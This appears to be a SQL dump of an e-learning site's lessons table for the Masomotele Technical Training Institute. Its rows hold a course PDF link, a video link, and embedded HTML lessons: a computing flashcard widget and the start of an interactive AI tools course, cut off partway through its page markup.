INSERT INTO `wpcu_mtti_lessons` VALUES
(1, 1, 1, 'Course', 'Outline', '<a href="https://masomoteletraining.co.ke/wp-content/uploads/2025/12/COMPUTER-PACKAGE-TRAINING-1.pdf">COMPUTER PACKAGE TRAINING</a>', 'pdf', 'https://masomoteletraining.co.ke/wp-content/uploads/2025/12/COMPUTER-PACKAGE-TRAINING-2.pdf', NULL, 423165, 60, 1, 1, 10, 'Published', 1, '2025-12-29 16:04:11', '2026-03-11 05:34:58', NULL, NULL),
(5, 12, NULL, 'AI: Flashcards — 21 Feb 2026', NULL, '<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Python Flashcards</title>\n    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">\n    <style>\n        body {\n            font-family: ''Open Sans'', sans-serif;\n            background-color: #fff;\n            margin: 0;\n            padding: 0;\n        }\n        .container {\n            max-width: 400px;\n            margin: 40px auto;\n            padding: 20px;\n            background-color: #fff;\n            border: 1px solid #ddd;\n            border-radius: 10px;\n            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);\n        }\n        .card {\n            position: relative;\n            width: 100%;\n            height: 200px;\n            border: 1px solid #ddd;\n            border-radius: 10px;\n            background-color: #fff;\n            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);\n            transition: transform 0.5s;\n            transform-style: preserve-3d;\n        }\n        .card.flipped {\n            transform: rotateY(180deg);\n        }\n        .card .front, .card .back {\n            position: absolute;\n            width: 100%;\n            height: 100%;\n            backface-visibility: hidden;\n            border-radius: 10px;\n        }\n        .card .front {\n            background-color: #fff;\n            z-index: 2;\n        }\n        .card .back {\n            background-color: #fff;\n            transform: rotateY(180deg);\n        }\n        .card .term {\n            font-size: 24px;\n            font-weight: bold;\n            padding: 20px;\n        }\n        .card .definition {\n            font-size: 18px;\n            padding: 20px;\n        }\n        .controls {\n            margin-top: 20px;\n            text-align: center;\n        }\n        .button {\n            background-color: #1B5E20;\n            color: #fff;\n            border: none;\n            padding: 10px 20px;\n            font-size: 16px;\n            cursor: pointer;\n            border-radius: 5px;\n        }\n        .button:hover {\n            background-color: #4CAF50;\n        }\n        .progress-bar {\n            width: 100%;\n            height: 10px;\n            background-color: #ddd;\n            border-radius: 5px;\n        }\n        .progress-bar .progress {\n            height: 10px;\n            background-color: #4CAF50;\n            border-radius: 5px;\n        }\n        footer {\n            background-color: #1B5E20;\n            color: #fff;\n            padding: 10px;\n            text-align: center;\n            clear: both;\n        }\n    </style>\n</head>\n<body>\n    <div class="container">\n        <div class="card" id="card">\n            <div class="front">\n                <div class="term" id="term">Computing</div>\n            </div>\n            <div class="back">\n                <div class="definition" id="definition">The study of the theory, experimentation, and engineering that form the basis for the design and use of computers.</div>\n            </div>\n        </div>\n        <div class="controls">\n            <button class="button" id="prev">Prev</button>\n            <button class="button" id="next">Next</button>\n            <button class="button" id="shuffle">Shuffle</button>\n            <button class="button" id="mark-as-learned">Mark as Learned</button>\n            <span id="card-counter">1/15</span>\n            <div class="progress-bar">\n                <div class="progress" id="progress" style="width: 0%;"></div>\n            </div>\n        </div>\n    </div>\n    <footer>\n        MTTI - Masomotele Technical Training Institute\n    </footer>\n    <script>\n        let cards = [\n            { term: "Computing", definition: "The study of the theory, experimentation, and engineering that form the basis for the design and use of computers." },\n            { term: "Computational Thinking", definition: "The process of breaking down complex problems into smaller, more manageable parts, and using logical reasoning to solve them." },\n            { term: "Program", definition: "A set of instructions that a computer can execute to perform a specific task." },\n            { term: "Code", definition: "The set of instructions that a computer can execute to perform a specific task." },\n            { term: "Decomposition", definition: "The process of breaking down a complex problem into smaller, more manageable parts." },\n            { term: "Pattern Recognition", definition: "The process of identifying patterns in data or behavior." },\n            { term: "Abstraction", definition: "The process of simplifying complex systems by focusing on essential features and hiding non-essential details." },\n            { term: "Algorithm", definition: "A set of instructions that a computer can execute to solve a specific problem." },\n            { term: "Flowchart", definition: "A graphical representation of the steps involved in solving a problem or completing a task." },\n            { term: "Pseudocode", definition: "A high-level representation of the steps involved in solving a problem or completing a task." },\n            { term: "Variables", definition: "Named storage locations that hold values." },\n            { term: "Data Types", definition: "The type of value that a variable can hold, such as integer, string, or boolean." },\n            { term: "Control Structures", definition: "Statements that control the flow of a program, such as if-else statements or loops." },\n            { term: "Functions", definition: "Reusable blocks of code that perform a specific task." },\n            { term: "Debugging", definition: "The process of finding and fixing errors in a program." }\n        ];\n        let currentCard = 0;\n        let learnedCards = [];\n        let progress = 0;\n        document.getElementById("term").innerHTML = cards[currentCard].term;\n        document.getElementById("definition").innerHTML = cards[currentCard].definition;\n        document.getElementById("card-counter").innerHTML = (currentCard + 1) + "/" + cards.length;\n        document.getElementById("progress").style.width = (progress / cards.length) * 100 + "%";\n        document.getElementById("prev").addEventListener("click", function() {\n            if (currentCard > 0) {\n                currentCard--;\n                document.getElementById("term").innerHTML = cards[currentCard].term;\n                document.getElementById("definition").innerHTML = cards[currentCard].definition;\n                document.getElementById("card-counter").innerHTML = (currentCard + 1) + "/" + cards.length;\n            }\n        });\n        document.getElementById("next").addEventListener("click", function() {\n            if (currentCard < cards.length - 1) {\n                currentCard++;\n                document.getElementById("term").innerHTML = cards[currentCard].term;\n                document.getElementById("definition").innerHTML = cards[currentCard].definition;\n                document.getElementById("card-counter").innerHTML = (currentCard + 1) + "/" + cards.length;\n            }\n        });\n        document.getElementById("shuffle").addEventListener("click", function() {\n            cards = shuffleArray(cards);\n            currentCard = 0;\n            document.getElementById("term").innerHTML = cards[currentCard].term;\n            document.getElementById("definition").innerHTML = cards[currentCard].definition;\n            document.getElementById("card-counter").innerHTML = (currentCard + 1) + "/" + cards.length;\n        });\n        document.getElementById("mark-as-learned").addEventListener("click", function() {\n            learnedCards.push(cards[currentCard]);\n            progress++;\n            document.getElementById("progress").style.width = (progress / cards.length) * 100 + "%";\n            if (currentCard < cards.length - 1) {\n                currentCard++;\n                document.getElementById("term").innerHTML = cards[currentCard].term;\n                document.getElementById("definition").innerHTML = cards[currentCard].definition;\n                document.getElementById("card-counter").innerHTML = (currentCard + 1) + "/" + cards.length;\n            }\n        });\n        document.getElementById("card").addEventListener("click", function() {\n            document.getElementById("card").classList.toggle("flipped");\n        });\n        function shuffleArray(array) {\n            for (let i = array.length - 1; i > 0; i--) {\n                let j = Math.floor(Math.random() * (i + 1));\n                let temp = array[i];\n                array[i] = array[j];\n                array[j] = temp;\n            }\n            return array;\n        }\n    </script>\n</body>\n</html>', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 0, 'Published', 1, '2026-02-21 12:35:18', '2026-02-21 12:35:18', NULL, NULL),
(6, 5, NULL, 'Digital Marketing In 5 Minutes', 'Introduction', NULL, 'video', 'https://masomoteletraining.co.ke/wp-content/uploads/2026/02/Digital-Marketing-In-5-Minutes.mp4', 'https://masomoteletraining.co.ke/wp-content/uploads/2026/02/Digital-Marketing-In-5-Minutes.mp4', NULL, NULL, 0, 0, 2, 'Published', 169, '2026-02-22 13:09:38', '2026-02-24 16:14:39', NULL, NULL),
(7, 7, NULL, 'Ai Tools Lesson', 'AI Start', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>AI & AI Tools — Interactive Course | M.T.T.I</title>\n<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">\n<style>\n:root {\n  --bg: #0a0e1a;\n  --surface: #111827;\n  --surface2: #1a2236;\n  --border: rgba(99,179,237,0.15);\n  --blue: #3b82f6;\n  --blue-light: #60a5fa;\n  --cyan: #06b6d4;\n  --violet: #8b5cf6;\n  --emerald: #10b981;\n  --amber: #f59e0b;\n  --rose: #f43f5e;\n  --white: #f8fafc;\n  --muted: rgba(248,250,252,0.5);\n  --shadow: rgba(0,0,0,0.4);\n}\n* { box-sizing: border-box; margin: 0; padding: 0; }\n\nbody {\n  font-family: ''Space Grotesk'', sans-serif;\n  background: var(--bg);\n  color: var(--white);\n  min-height: 100vh;\n  overflow-x: hidden;\n}\n\n/* ── SCREENS ── */\n.screen { display: none; min-height: 100vh; }\n.screen.active { display: flex; flex-direction: column; }\n\n/* ── SPLASH ── */\n#splash {\n  background: var(--bg);\n  align-items: center;\n  justify-content: center;\n  text-align: center;\n  position: relative;\n  overflow: hidden;\n}\n.splash-grid {\n  position: absolute; inset: 0;\n  background-image:\n    linear-gradient(rgba(59,130,246,.06) 1px, transparent 1px),\n    linear-gradient(90deg, rgba(59,130,246,.06) 1px, transparent 1px);\n  background-size: 48px 48px;\n}\n.splash-glow {\n  position: absolute;\n  top: -200px; left: 50%; transform: translateX(-50%);\n  width: 800px; height: 600px;\n  background: radial-gradient(ellipse, rgba(59,130,246,.18) 0%, rgba(139,92,246,.1) 40%, transparent 70%);\n  pointer-events: none;\n}\n.splash-content {\n  position: relative; z-index: 2;\n  padding: 40px 24px;\n  animation: fadeUp .8s ease both;\n  max-width: 700px;\n}\n.splash-badge {\n  display: inline-flex; align-items: center; gap: 8px;\n  font-family: ''JetBrains Mono'', monospace;\n  font-size: 11px; letter-spacing: 2px; text-transform: uppercase;\n  color: var(--cyan);\n  border: 1px solid rgba(6,182,212,.3);\n  padding: 6px 16px; border-radius: 40px;\n  margin-bottom: 32px;\n}\n.splash-badge::before { content: ''●''; font-size: 8px; animation: blink 1.4s ease infinite; }\n@keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.2; } }\n.splash-title {\n  font-family: ''Syne'', sans-serif;\n  font-size: clamp(44px, 9vw, 88px);\n  font-weight: 800;\n  line-height: 0.95;\n  margin-bottom: 24px;\n  letter-spacing: -2px;\n}\n.splash-title .word1 { color: var(--white); display: block; }\n.splash-title .word2 {\n  background: linear-gradient(135deg, var(--blue) 0%, var(--cyan) 50%, var(--violet) 100%);\n  -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n  background-clip: text;\n}\n.splash-sub {\n  font-size: 17px; color: var(--muted); max-width: 500px;\n  margin: 0 auto 36px; line-height: 1.65; font-weight: 300;\n}\n.weeks-row {\n  display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;\n  margin-bottom: 44px;\n}\n.week-chip {\n  background: var(--surface2);\n  border: 1px solid var(--border);\n  padding: 10px 20px; border-radius: 10px;\n  font-size: 13px; color: var(--muted);\n}\n.week-chip strong { color: var(--blue-light); display: block; font-size: 11px; font-family: ''JetBrains Mono'', monospace; margin-bottom: 2px; }\n\n/* ── BUTTONS ── */\n.btn {\n  display: inline-flex; align-items: center; gap: 8px;\n  font-family: ''Space Grotesk'', sans-serif;\n  font-weight: 600; font-size: 14px;\n  padding: 13px 26px; border-radius: 10px;\n  cursor: pointer; border: none;\n  transition: all .2s ease; text-decoration: none;\n}\n.btn-blue { background: var(--blue); color: white; }\n.btn-blue:hover { background: var(--blue-light); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(59,130,246,.4); }\n.btn-outline { background: transparent; color: var(--white); border: 1.5px solid rgba(255,255,255,.2); }\n.btn-outline:hover { border-color: var(--white); background: rgba(255,255,255,.06); }\n.btn-surface { background: var(--surface2); color: var(--white); border: 1px solid var(--border); }\n.btn-surface:hover { background: var(--surface); transform: translateY(-2px); }\n.btn-emerald { background: var(--emerald); color: var(--bg); }\n.btn-emerald:hover { filter: brightness(1.15); transform: translateY(-2px); }\n.btn-violet { background: var(--violet); color: white; }\n.btn-violet:hover { filter: brightness(1.15); transform: translateY(-2px); }\n.btn-amber { background: var(--amber); color: var(--bg); }\n.btn-amber:hover { filter: brightness(1.1); }\n\n/* ── TOPBAR ── */\n.topbar {\n  background: rgba(10,14,26,.95);\n  backdrop-filter: blur(12px);\n  border-bottom: 1px solid var(--border);\n  padding: 14px 24px;\n  display: flex; align-items: center;\n  justify-content: space-between;\n  position: sticky; top: 0; z-index: 100; gap: 16px;\n}\n.topbar-brand {\n  font-family: ''Syne'', sans-serif; font-size: 18px; font-weight: 800;\n  color: var(--white); letter-spacing: -0.5px;\n}\n.topbar-brand span { color: var(--cyan); }\n.progress-bar-wrap {\n  flex: 1; max-width: 380px;\n  background: rgba(255,255,255,.08);\n  border-radius: 100px; height: 5px; overflow: hidden;\n}\n.progress-bar-fill {\n  height: 100%;\n  background: linear-gradient(90deg, var(--blue), var(--cyan));\n  border-radius: 100px; transition: width .5s ease;\n}\n.progress-label {\n  font-family: ''JetBrains Mono'', monospace;\n  font-size: 11px; color: var(--muted); white-space: nowrap;\n}\n\n/* ── MODULE NAV ── */\n.module-nav {\n  background: var(--surface);\n  border-bottom: 1px solid var(--border);\n  padding: 0 24px;\n  display: flex; gap: 0; overflow-x: auto;\n}\n.module-tab {\n  font-size: 12px; font-weight: 600;\n  color: var(--muted);\n  padding: 13px 16px;\n  border-bottom: 2px solid transparent;\n  cursor: pointer; white-space: nowrap; transition: all .2s;\n}\n.module-tab.active { color: var(--cyan); border-color: var(--cyan); }\n.module-tab.done { color: var(--emerald); }\n.module-tab.locked { opacity: .35; cursor: not-allowed; }\n\n/* ── LESSON CONTENT ── */\n.lesson-wrap {\n  max-width: 880px; margin: 0 auto;\n  padding: 40px 24px 100px; width: 100%;\n}\n.lesson-header { margin-bottom: 36px; animation: fadeUp .5s ease both; }\n.lesson-tag {\n  font-family: ''JetBrains Mono'', monospace;\n  font-size: 11px; letter-spacing: 2px; text-transform: uppercase;\n  color: var(--cyan); margin-bottom: 10px;\n}\n.lesson-title {\n  font-family: ''Syne'', sans-serif;\n  font-size: clamp(26px, 5vw, 44px);\n  font-weight: 800; line-height: 1.1; margin-bottom: 12px;\n  letter-spacing: -0.5px;\n}\n.lesson-desc {\n  font-size: 15px; color: var(--muted);\n  line-height: 1.7; max-width: 660px; font-weight: 300;\n}\n\n/* ── CONTENT BLOCKS ── */\n.content-block {\n  background: var(--surface);\n  border: 1px solid var(--border);\n  border-radius: 16px;\n  padding: 28px 32px;\n  margin-bottom: 20px;\n  animation: fadeUp .5s ease both;\n}\n.block-title {\n  font-family: ''Syne'', sans-serif;\n  font-size: 20px; font-weight: 700; margin-bottom: 16px;\n  color: var(--white);\n}\n.block-text {\n  font-size: 15px; line-height: 1.75;\n  color: rgba(248,250,252,.75); font-weight: 300;\n}\n.block-text strong { font-weight: 600; color: var(--white); }\n\n/* ── CARDS GRID ── */\n.cards-grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));\n  gap: 14px; margin: 18px 0;\n}\n.concept-card {\n  background: var(--surface2);\n  border: 1px solid var(--border);\n  border-radius: 12px; padding: 18px;\n  border-left: 3px solid var(--cyan);\n  transition: transform .2s, border-color .2s;\n}\n.concept-card:hover { transform: translateY(-3px); border-left-color: var(--blue); }\n.concept-card .icon { font-size: 26px; margin-bottom: 10px; }\n.concept-card h4 { font-size: 13px; font-weight: 700; margin-bottom: 5px; color: var(--cyan); }\n.concept-card p { font-size: 12px; line-height: 1.55; color: var(--muted); font-weight: 300; }\n\n/* ── INFO PILL ── */\n.info-pill {\n  display: inline-flex; gap: 5px; align-items: center;\n  background: rgba(59,130,246,.12);\n  border: 1px solid rgba(59,130,246,.25);\n  border-radius: 100px; padding: 4px 12px;\n  font-size: 12px; font-weight: 600; color: var(--blue-light);\n  margin: 3px 3px 3px 0;\n}\n\n/* ── TERM HIGHLIGHT ── */\n.term {\n  background: linear-gradient(180deg, transparent 55%, rgba(6,182,212,.25) 55%);\n  font-weight: 600; color: var(--white);\n}\n\n/* ── TABLE ── */\n.data-table { width: 100%; border-collapse: collapse; font-size: 13px; }\n.data-table th {\n  background: var(--surface2); color: var(--cyan);\n  padding: 11px 14px; text-align: left; font-weight: 700;\n  font-family: ''JetBrains Mono'', monospace; font-size: 11px;\n  letter-spacing: 1px; text-transform: uppercase;\n  border-bottom: 1px solid var(--border);\n}\n.data-table td { padding: 10px 14px; border-bottom: 1px solid rgba(99,179,237,.08); color: rgba(248,250,252,.8); }\n.data-table tr:last-child td { border-bottom: none; }\n.data-table tr:nth-child(even) td { background: rgba(255,255,255,.02); }\n.tick { color: var(--emerald); }\n.cross { color: var(--rose); }\n\n/* ── TIMELINE STEPS ── */\n.timeline-item {\n  display: flex; gap: 16px; align-items: flex-start;\n  background: var(--surface2); border: 1px solid var(--border);\n  border-radius: 12px; padding: 16px 20px;\n  margin-bottom: 10px;\n}\n.timeline-num {\n  width: 30px; height: 30px; border-radius: 50%;\n  background: linear-gradient(135deg, var(--blue), var(--cyan));\n  color: var(--bg); display: flex; align-items: center; justify-content: center;\n  font-family: ''JetBrains Mono'', monospace; font-size: 12px; font-weight: 700;\n  flex-shrink: 0;\n}\n.timeline-content h4 { font-weight: 700; font-size: 14px; margin-bottom: 3px; }\n.timeline-content p { font-size: 13px; color: var(--muted); font-weight: 300; line-height: 1.5; }\n\n/* ── COMPARE COLS ── */\n.compare-cols {\n  display: grid; grid-template-columns: 1fr 1fr; gap: 16px;\n}\n.compare-col {\n  background: var(--surface2); border: 1px solid var(--border);\n  border-radius: 12px; padding: 20px;\n}\n.compare-col.good { border-top: 3px solid var(--emerald); }\n.compare-col.bad { border-top: 3px solid var(--rose); }\n.compare-col-title { font-weight: 700; font-size: 14px; margin-bottom: 12px; }\n.compare-col.good .compare-col-title { color: var(--emerald); }\n.compare-col.bad .compare-col-title { color: var(--rose); }\n.compare-item {\n  font-size: 13px; color: var(--muted); padding: 5px 0;\n  border-bottom: 1px solid rgba(255,255,255,.05);\n  display: flex; gap: 8px; align-items: flex-start; line-height: 1.4;\n}\n.compare-item:last-child { border-bottom: none; }\n\n/* ── SCENARIO / DECISION ── */\n.scenario-box {\n  background: linear-gradient(135deg, #1e3a5f 0%, #0f2040 100%);\n  border: 1px solid rgba(59,130,246,.3);\n  border-radius: 16px; padding: 32px;\n  color: var(--white); margin-bottom: 24px;\n  position: relative; overflow: hidden;\n  animation: fadeUp .5s ease both;\n}\n.scenario-box::after {\n  content: ''?'';\n  position: absolute; right: 24px; top: 8px;\n  font-family: ''Syne'', sans-serif; font-size: 120px;\n  color: rgba(59,130,246,.07); line-height: 1;\n}\n.scenario-label {\n  font-family: ''JetBrains Mono'', monospace;\n  font-size: 11px; letter-spacing: 2px; color: var(--cyan); margin-bottom: 12px;\n}\n.scenario-title { font-family: ''Syne'', sans-serif; font-size: 22px; font-weight: 800; margin-bottom: 12px; }\n.scenario-text { font-size: 15px; line-height: 1.65; font-weight: 300; opacity: .9; }\n\n.choices-wrap { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }\n.choice-btn {\n  background: var(--surface);\n  border: 1.5px solid var(--border);\n  border-radius: 12px; padding: 16px 20px;\n  text-align: left; cursor: pointer;\n  font-family: ''Space Grotesk'', sans-serif;\n  font-size: 14px; font-weight: 500; color: var(--white);\n  transition: all .2s;\n  display: flex; align-items: flex-start; gap: 14px;\n  animation: fadeUp .4s ease both;\n}\n.choice-btn:hover { border-color: var(--blue); background: rgba(59,130,246,.08); transform: translateX(4px); }\n.choice-btn.selected-correct { border-color: var(--emerald); background: rgba(16,185,129,.08); }\n.choice-btn.selected-wrong { border-color: var(--rose); background: rgba(244,63,94,.08); }\n.choice-letter {\n  width: 28px; height: 28px; border-radius: 50%;\n  background: var(--surface2);\n  display: flex; align-items: center; justify-content: center;\n  font-family: ''JetBrains Mono'', monospace; font-size: 12px; font-weight: 700;\n  flex-shrink: 0; color: var(--muted);\n}\n.choice-btn.selected-correct .choice-letter { background: var(--emerald); color: var(--bg); }\n.choice-btn.selected-wrong .choice-letter { background: var(--rose); color: white; }\n.choice-text { flex: 1; line-height: 1.5; }\n\n/* ── FEEDBACK ── */\n.feedback-box {\n  border-radius: 14px; padding: 22px 26px; margin-bottom: 24px;\n  animation: popIn .4s ease both; display: none;\n}\n.feedback-box.correct { background: rgba(16,185,129,.1); border: 1.5px solid var(--emerald); }\n.feedback-box.wrong { background: rgba(244,63,94,.08); border: 1.5px solid var(--rose); }\n.feedback-box.show { display: block; }\n.feedback-icon { font-size: 28px; margin-bottom: 8px; }\n.feedback-title { font-family: ''Syne'', sans-serif; font-size: 18px; font-weight: 800; margin-bottom: 8px; }\n.feedback-text { font-size: 14px; line-height: 1.65; color: var(--muted); font-weight: 300; }\n.feedback-text strong { font-weight: 700; color: var(--white); }\n\n/* ── QUIZ ── */\n.quiz-card {\n  background: var(--surface);\n  border: 1px solid var(--border);\n  border-radius: 16px; padding: 28px; margin-bottom: 20px;\n  animation: fadeUp .5s ease both;\n}\n.quiz-q {\n  font-family: ''Syne'', sans-serif; font-size: 18px; font-weight: 700;\n  margin-bottom: 6px; color: var(--white);\n}\n.quiz-sub { font-size: 12px; color: var(--muted); margin-bottom: 20px; font-family: ''JetBrains Mono'', monospace; }\n.quiz-options { display: flex; flex-direction: column; gap: 10px; }\n.quiz-opt {\n  background: var(--surface2);\n  border: 1.5px solid var(--border);\n  border-radius: 10px; padding: 12px 16px;\n  cursor: pointer; font-size: 13px; font-weight: 500;\n  transition: all .2s; display: flex; gap: 10px; align-items: center; color: var(--white);\n}\n.quiz-opt:hover { border-color: var(--blue); background: rgba(59,130,246,.08); }\n.quiz-opt.correct-ans { border-color: var(--emerald); background: rgba(16,185,129,.1); color: var(--emerald); }\n.quiz-opt.wrong-ans { border-color: var(--rose); background: rgba(244,63,94,.08); color: var(--rose); }\n.quiz-opt.reveal-correct { border-color: var(--emerald); background: rgba(16,185,129,.08); }\n\n/* ── DOTS ── */\n.lesson-dots {\n  display: flex; gap: 7px; justify-content: center; margin-bottom: 32px;\n}\n.dot {\n  width: 7px; height: 7px; border-radius: 50%;\n  background: var(--surface2); border: 1px solid var(--border);\n  transition: all .3s;\n}\n.dot.current { background: var(--cyan); width: 22px; border-radius: 4px; border-color: var(--cyan); }\n.dot.done { background: var(--emerald); border-color: var(--emerald); }\n\n/* ── NAV FOOTER ── */\n.nav-footer {\n  display: flex; justify-content: space-between;\n  align-items: center; padding: 20px 0; gap: 16px; flex-wrap: wrap;\n}\n\n/* ── SUMMARY ── */\n#summary {\n  background: var(--bg); align-items: center; justify-content: center;\n}\n.summary-content {\n  max-width: 660px; padding: 40px 24px; text-align: center;\n  animation: fadeUp .7s ease both;\n}\n.trophy { font-size: 80px; margin-bottom: 24px; display: block; animation: bounce 1s ease .5s both; }\n.summary-title {\n  font-family: ''Syne'', sans-serif;\n  font-size: clamp(30px, 6vw, 54px); font-weight: 800;\n  color: var(--white); margin-bottom: 16px; letter-spacing: -1px;\n}\n.summary-title span { color: var(--cyan); }\n.summary-sub { font-size: 15px; color: var(--muted); margin-bottom: 40px; font-weight: 300; line-height: 1.6; }\n.score-row {\n  display: flex; justify-content: center; gap: 20px;\n  margin-bottom: 36px; flex-wrap: wrap;\n}\n.score-chip {\n  background: var(--surface); border: 1px solid var(--border);\n  border-radius: 14px; padding: 18px 24px;\n}\n.score-chip .num {\n  font-family: ''Syne'', sans-serif; font-size: 40px; font-weight: 800;\n  color: var(--cyan); line-height: 1;\n}\n.score-chip .lbl { font-size: 11px; color: var(--muted); margin-top: 4px; font-family: ''JetBrains Mono'', monospace; letter-spacing: 1px; }\n.topic-pills {\n  display: flex; flex-wrap: wrap; gap: 8px;\n  justify-content: center; margin-bottom: 36px;\n}\n.topic-pill {\n  background: rgba(6,182,212,.1);\n  border: 1px solid rgba(6,182,212,.25);\n  color: var(--cyan); padding: 6px 14px;\n  border-radius: 100px; font-size: 12px; font-weight: 600;\n}\n\n/* ── TOOL CARD ── */\n.tool-card {\n  background: var(--surface2);\n  border: 1px solid var(--border);\n  border-radius: 12px; padding: 18px 20px;\n  margin-bottom: 12px; transition: border-color .2s;\n}\n.tool-card:hover { border-color: var(--blue); }\n.tool-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 8px; flex-wrap: wrap; gap: 8px; }\n.tool-name { font-weight: 700; font-size: 15px; color: var(--white); }\n.tool-cost { font-family: ''JetBrains Mono'', monospace; font-size: 11px; color: var(--amber); background: rgba(245,158,11,.1); border: 1px solid rgba(245,158,11,.2); padding: 3px 9px; border-radius: 100px; }\n.tool-cost.free { color: var(--emerald); background: rgba(16,185,129,.1); border-color: rgba(16,185,129,.2); }\n.tool-desc { font-size: 13px; color: var(--muted); line-height: 1.55; font-weight: 300; }\n.tool-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }\n.tool-tag { font-size: 11px; background: rgba(59,130,246,.1); border: 1px solid rgba(59,130,246,.2); color: var(--blue-light); padding: 2px 9px; border-radius: 100px; font-weight: 600; }\n\n/* ── ANIMATIONS ── */\n@keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }\n@keyframes popIn { from { opacity: 0; transform: scale(.95); } to { opacity: 1; transform: scale(1); } }\n@keyframes bounce { 0%,100% { transform: translateY(0); } 40% { transform: translateY(-16px); } 60% { transform: translateY(-7px); } }\n\n/* ── NARRATOR ── */\n#narrator-bar {\n  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);\n  z-index: 9999; background: var(--surface);\n  border: 1px solid rgba(6,182,212,.4);\n  border-radius: 100px; padding: 10px 18px;\n  display: flex; align-items: center; gap: 12px;\n  box-shadow: 0 8px 32px rgba(0,0,0,.6);\n  min-width: 300px; max-width: 92vw;\n  animation: fadeUp .4s ease both;\n  transition: opacity .3s;\n}\n#narrator-bar.hidden { opacity: 0; pointer-events: none; }\n.narrator-icon {\n  width: 34px; height: 34px; border-radius: 50%;\n  background: linear-gradient(135deg, var(--blue), var(--cyan));\n  display: flex; align-items: center; justify-content: center;\n  font-size: 14px; cursor: pointer; transition: transform .15s; flex-shrink: 0;\n}\n.narrator-icon:hover { transform: scale(1.1); }\n.narrator-label { flex: 1; overflow: hidden; }\n.narrator-status { font-family: ''JetBrains Mono'', monospace; font-size: 10px; color: var(--muted); letter-spacing: 1px; text-transform: uppercase; }\n.narrator-title { font-size: 12px; font-weight: 600; color: var(--white); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 1px; }\n.narrator-wave { display: flex; align-items: center; gap: 2px; height: 20px; flex-shrink: 0; }\n.narrator-wave .bar { width: 3px; background: var(--cyan); border-radius: 2px; height: 3px; }\n.narrator-wave.active .bar:nth-child(1) { animation: wave .9s ease infinite 0.0s; }\n.narrator-wave.active .bar:nth-child(2) { animation: wave .9s ease infinite 0.15s; }\n.narrator-wave.active .bar:nth-child(3) { animation: wave .9s ease infinite 0.3s; }\n.narrator-wave.active .bar:nth-child(4) { animation: wave .9s ease infinite 0.15s; }\n.narrator-wave.active .bar:nth-child(5) { animation: wave .9s ease infinite 0.0s; }\n@keyframes wave { 0%,100% { height: 3px; } 50% { height: 17px; } }\n.narrator-speed {\n  font-family: ''JetBrains Mono'', monospace; font-size: 10px;\n  color: var(--muted); cursor: pointer; padding: 4px 7px;\n  border-radius: 4px; border: 1px solid rgba(255,255,255,.1);\n  transition: all .2s; white-space: nowrap; flex-shrink: 0;\n}\n.narrator-speed:hover { color: var(--cyan); border-color: rgba(6,182,212,.4); }\n.narrator-btn {\n  background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.1);\n  border-radius: 50%; width: 28px; height: 28px;\n  display: flex; align-items: center; justify-content: center;\n  cursor: pointer; font-size: 11px; transition: background .2s; flex-shrink: 0;\n}\n.narrator-btn:hover { background: rgba(255,255,255,.14); }\n#narrator-toggle {\n  position: fixed; bottom: 24px; right: 24px; z-index: 9998;\n  background: var(--surface); border: 1px solid rgba(6,182,212,.4);\n  border-radius: 50%; width: 48px; height: 48px;\n  display: flex; align-items: center; justify-content: center;\n  font-size: 20px; cursor: pointer;\n  box-shadow: 0 4px 16px rgba(0,0,0,.5); transition: all .2s;\n}\n#narrator-toggle:hover { background: var(--surface2); transform: scale(1.05); }\n#narrator-toggle.bar-visible { display: none; }\n\n/* ── RESPONSIVE ── */\n@media(max-width: 560px) {\n  .topbar { flex-wrap: wrap; gap: 10px; }\n  .progress-bar-wrap { order: 3; max-width: 100%; }\n  .cards-grid { grid-template-columns: 1fr; }\n  .compare-cols { grid-template-columns: 1fr; }\n  .nav-footer { flex-direction: column; }\n  .nav-footer .btn { width: 100%; justify-content: center; }\n}\n</style>\n</head>\n<body>\n\n<!-- SPLASH -->\n<div class="screen active" id="splash">\n  <div class="splash-grid"></div>\n  <div class="splash-glow"></div>\n  <div class="splash-content">\n    <div class="splash-badge">M.T.T.I · ICDL Professional Certification</div>\n    <h1 class="splash-title">\n      <span class="word1">Artificial</span>\n      <span class="word2">Intelligence</span>\n    </h1>\n    <p class="splash-sub">An interactive journey through AI fundamentals and AI tools — with real-world Kenyan scenarios, decisions, and quizzes to lock in your knowledge.</p>\n    <div class="weeks-row">\n      <div class="week-chip"><strong>WEEK 1</strong>AI Fundamentals & How It Works</div>\n      <div class="week-chip"><strong>WEEK 2</strong>AI Tools — Paid, Free & Evaluation</div>\n    </div>\n    <div style="display:flex;gap:14px;justify-content:center;flex-wrap:wrap;">\n      <button class="btn btn-blue" onclick="startLesson()">Begin Learning &#8594;</button>\n      <button class="btn btn-outline" onclick="skipToSummary()">Preview Summary</button>\n    </div>\n  </div>\n</div>\n\n<!-- LESSON -->\n<div class="screen" id="lesson">\n  <div class="topbar">\n    <div class="topbar-brand">AI<span>Academy</span></div>\n    <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progressFill" style="width:0%"></div></div>\n    <div class="progress-label" id="progressLabel">Step 1 / 14</div>\n  </div>\n  <div class="module-nav" id="moduleNav">\n    <div class="module-tab active" data-mod="0">Week 1: AI Basics</div>\n    <div class="module-tab locked" data-mod="1">Week 